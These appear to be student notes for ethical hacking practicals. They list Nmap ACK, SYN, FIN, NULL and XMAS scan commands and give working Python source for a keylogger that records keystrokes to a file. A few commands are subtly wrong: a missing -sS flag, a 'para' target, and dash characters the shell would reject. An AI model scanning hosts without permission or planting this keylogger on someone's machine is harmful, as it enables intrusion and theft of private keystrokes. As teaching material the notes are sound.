EH practicals:

practical 4:Using Nmap scanner to perform port scanning of various
forms – ACK, SYN, FIN, NULL, XMAS.

1)ACK -sA (TCP ACK scan)
 nmap -sA -T4 scanme.nmap.org

2)SYN (Stealth) Scan (-sS) 
nmap -p22,113,139 scanme.nmap.org

3)FIN Scan (-sF) 
nmap -sF -T4 para

4)NULL Scan (-sN)
nmap –sN –p 22 scanme.nmap.org

5)XMAS Scan (-sX) 
nmap -sX -T4 scanme.nmap.org


practical 9:
Create a simple keylogger using Python.

from pynput.keyboard import Key, Listener
log_file_path = "Downloads/keylog.txt"
def write_to_log(key):
    with open(log_file_path, "a") as f:       
        f.write(str(key))        
        if key == Key.enter:
            f.write("\n")
def on_press(key):
    write_to_log(key)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
